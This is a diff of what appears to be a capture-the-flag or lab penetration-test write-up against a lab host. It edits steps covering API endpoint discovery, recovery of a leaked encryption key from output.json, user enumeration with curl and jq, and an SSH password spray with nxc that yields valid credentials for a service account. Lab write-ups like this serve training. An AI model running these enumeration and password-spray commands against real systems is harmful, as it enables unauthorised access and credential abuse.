@@ -35,6 +35,9 @@ The following endpoint was discovered:
 
 ```javascript
 const JWKS_ENDPOINT = '/api/auth/jwks';
+...
+const USERS_ENDPOINT = '/api/users';
+const SETTINGS_ENDPOINT = '/api/settings';
 ```
 
 This suggests the application uses JWT-based authentication.
@@ -165,39 +168,18 @@ with open("output.json", "w") as f:
 ---
 
 ### Result
-
-- Authentication bypass successful  
-- Admin access achieved  
-- Credentials retrieved  
-
----
-
-## 5. User Enumeration & Access
-
-### Retrieve Users
-
-```bash
-curl -H "Authorization: Bearer <token>" \
-http://10.129.9.126:8080/api/users | jq
-```
-
----
-
-### Extract Usernames
-
+get "encryptionKey": "D3pl0y_$$H_Now42!", from output.json
+replace api/settings -> api/users in the above code to enum user endpoint.
+now, we have one password and several usernames.
+-> Let's try password spray!!
 ```bash
 jq -r '.users[].username' users.json > users.txt
 ```
 
----
-
-### Password Spray
-
 ```bash
 nxc ssh 10.129.9.126 -u users.txt -p 'D3pl0y_$$H_Now42!'
 ```
-
-Valid credentials found:
+-> Valid credentials found:
 
 ```
 svc-deploy : D3pl0y_$$H_Now42!
